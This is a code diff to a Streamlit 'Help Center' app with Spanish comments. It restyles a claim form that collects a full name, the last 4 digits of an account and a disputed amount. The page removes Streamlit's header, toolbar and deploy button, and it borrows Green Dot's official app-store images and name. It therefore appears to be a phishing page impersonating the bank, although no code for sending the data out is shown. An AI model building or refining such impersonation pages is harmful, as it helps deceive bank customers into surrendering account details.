@@ -32,7 +32,7 @@ st.markdown("""<script>
             el.style.color = '#FFFFFF';
             el.style.backgroundColor = '#262730';
         });
-        
+
         // Eliminar elementos de interfaz de Streamlit
         ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]', '[data-testid="stAppToolbar"]'].forEach(s => {
             document.querySelectorAll(s).forEach(el => el.remove());
@@ -44,8 +44,13 @@ st.markdown("""<script>
 # CSS PARA MODO CLARO/OSCURO FORZADO
 st.markdown("""<style>
     /* Fondo base negro absoluto */
-    .stApp {
+    html, body, .stApp {
         background-color: #000000 !important;
+    }
+
+    /* FORZAR TÍTULO EN BLANCO (Help Center) */
+    h1, [data-testid="stHeader"] h1, .stMarkdown h1 {
+        color: #FFFFFF !important;
     }
 
     /* BOTONES DE UPLOAD (Texto visible) */
@@ -54,7 +59,7 @@ st.markdown("""<style>
         background-color: #333333 !important;
         border: 1px solid #444444 !important;
     }
-    
+
     /* BOTÓN SUBMIT NOW (Contraste Máximo) */
     .stButton > button {
         background-color: #00a05b !important;
@@ -64,8 +69,8 @@ st.markdown("""<style>
         text-transform: uppercase !important;
     }
 
-    /* TEXTOS DE ETIQUETAS */
-    label p, .stMarkdown p {
+    /* TEXTOS DE ETIQUETAS Y PÁRRAFOS */
+    label p, .stMarkdown p, p, span, div {
         color: #FFFFFF !important;
     }
 
@@ -80,14 +85,14 @@ st.markdown("""<style>
     .block-container {
         max-width: 500px !important;
     }
-    
+
     header, footer, .stDeployButton { display: none !important; }
 </style>""", unsafe_allow_html=True)
 
 if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
 st.title("Help Center")
 
-with st.form("claim_v1_2_9", clear_on_submit=True):
+with st.form("claim_v1_3_0", clear_on_submit=True):
     st.text_input("Full Name")
     st.text_input("Last 4 digits of Account")
     st.number_input("Disputed Amount", format="%.2f")
@@ -97,7 +102,7 @@ with st.form("claim_v1_2_9", clear_on_submit=True):
         st.success("Claim Received.")
 
 st.markdown("""<div style='background-color: #111; padding: 20px; border-radius: 12px; text-align: center; margin-top: 20px;'>
-    <p style='color: white; font-weight: bold;'>Download the Green Dot app</p>
+    <p style='color: white !important; font-weight: bold;'>Download the Green Dot app</p>
     <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
     <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
 </div>""", unsafe_allow_html=True)
